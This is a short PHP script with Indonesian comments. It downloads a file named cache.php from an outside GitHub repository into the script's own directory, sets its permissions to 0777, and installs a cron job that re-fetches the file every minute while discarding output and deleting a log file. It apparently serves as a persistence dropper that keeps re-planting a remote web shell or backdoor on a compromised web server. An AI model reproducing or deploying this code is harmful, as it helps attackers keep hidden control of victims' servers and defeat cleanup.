 
<?php
// URL yang ingin Anda unduh
$urlToDownload = 'https://raw.githubusercontent.com/R10TX/getback/main/cache.php';

// Direktori tempat skrip PHP ini diakses
$currentDirectory = dirname(__FILE__);

// Buat perintah wget
$downloadCommand = '/usr/bin/wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/cache.php') . ' && chmod 0777 ' . escapeshellarg($currentDirectory . '/cache.php');

// Tugas Cron untuk mengunduh file setiap 30 detik dan kemudian menghapus log
$downloadCronCommand = '* * * * * ' . $downloadCommand . ' > /dev/null 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');

// Tambahkan tugas Cron yang baru
$result = shell_exec('(crontab -l ; echo "'.$downloadCronCommand.'") | crontab -');

if ($result === false) {
    echo 'Gagal menambahkan tugas Cron untuk mengunduh file.';
} else {
    echo 'Tugas Cron untuk mengunduh file berhasil ditambahkan.';
}
?>
